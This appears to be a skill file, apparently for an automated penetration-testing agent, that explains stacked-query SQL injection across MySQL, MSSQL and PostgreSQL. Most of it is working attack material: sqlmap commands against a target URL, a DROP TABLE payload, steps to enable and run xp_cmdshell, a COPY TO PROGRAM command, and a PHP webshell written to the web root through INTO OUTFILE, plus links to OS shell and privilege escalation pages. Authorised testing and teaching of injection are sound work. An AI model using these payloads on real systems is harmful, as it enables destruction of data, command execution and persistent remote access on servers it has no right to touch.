# Skill: Stacked Queries SQL Injection

## Metadata
- Phase: detection
- Techniques: S
- DB Targets: MySQL, MSSQL, PostgreSQL, SQLite (not Oracle)
- Risk Level: medium (enables writes, command execution)
- Prerequisites: application supports multi-statement SQL execution

## When to Use

Use when you need to execute **non-SELECT statements** (INSERT, UPDATE, DELETE, EXEC) or when the application supports multiple SQL statements separated by semicolons. Stacked queries are essential for:
- Creating/modifying database objects
- Executing OS commands (MSSQL `xp_cmdshell`, PostgreSQL `COPY ... FROM PROGRAM`)
- Enabling features that require stacked execution
- Injecting UDFs and procedures

Note: Stacked queries work on MySQL/MSSQL/PostgreSQL but NOT on Oracle by default.

## How Stacked Queries Work

Terminates the original query with `;` and appends a new independent statement:
```sql
original: SELECT * FROM users WHERE id=1
injected: SELECT * FROM users WHERE id=1; DROP TABLE temp_exploit--
injected: SELECT * FROM users WHERE id=1; EXEC xp_cmdshell('whoami')--
```

## Minimum Viable Command

```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=S --batch
```

## Recommended Full Command

```bash
sqlmap -u "http://target.com/page.php?id=1" \
  --technique=S \
  --dbms=mysql \
  --batch \
  --level=2 \
  --risk=2 \
  -v 2
```

## Manual Verification

```sql
-- Test if stacking is allowed (harmless)
?id=1; SELECT 1--
?id=1; WAITFOR DELAY '0:0:0'--   (MSSQL)
?id=1; SELECT PG_SLEEP(0)--       (PostgreSQL)
```

If no error and application continues normally, stacking is likely supported.

## OS Command Execution via Stacked Queries

### MSSQL: xp_cmdshell
```sql
-- Enable xp_cmdshell (requires SA or sysadmin)
;EXEC sp_configure 'show advanced options',1;RECONFIGURE;
;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;

-- Execute command
;EXEC xp_cmdshell 'whoami';--

-- SQLMap shortcut
sqlmap -u "TARGET" --technique=S --dbms=mssql --os-shell
```

### PostgreSQL: COPY FROM PROGRAM
```sql
-- Write file (as postgres user)
;COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned.txt';--

-- SQLMap uses this automatically with --os-cmd
```

### MySQL: SELECT INTO OUTFILE (requires FILE privilege)
```sql
;SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';--
```

## Stacked + Time-Based (for detection without results)

```bash
# Test stacked with time-based payload
sqlmap -u "TARGET" --technique=ST --batch
```

## Step-by-Step

1. Test basic stacked query support (no error with `;SELECT 1`)
2. Run detection command
3. Identify supported stacked features by DBMS
4. Escalate to OS command execution if in scope

## Expected Output
```
[INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable
```

## DBMS Support Matrix

| DBMS | Stacked Queries | OS Commands |
|------|-----------------|-------------|
| MySQL/MariaDB | Yes | SELECT INTO OUTFILE (needs FILE priv) |
| MSSQL | Yes | xp_cmdshell (needs SA/sysadmin) |
| PostgreSQL | Yes | COPY FROM PROGRAM |
| Oracle | No (by default) | N/A |
| SQLite | Limited | N/A |

## Red Flags (wrong skill)
- Oracle target -> stacked queries not supported, use UNION or error-based
- Application returns error on `;` -> parameter may be in WHERE clause with ORM that prevents stacking
- Works in detection but not exploitation -> privilege issue (need higher DB privileges)

## Follow-Up
- Stacked works -> [OS Shell](../03_exploitation/os_shell.md) for command execution
- MSSQL target -> [Privilege Escalation](../03_exploitation/privilege_escalation.md) for xp_cmdshell
- MySQL with FILE priv -> [File Write](../03_exploitation/file_write.md) for webshell
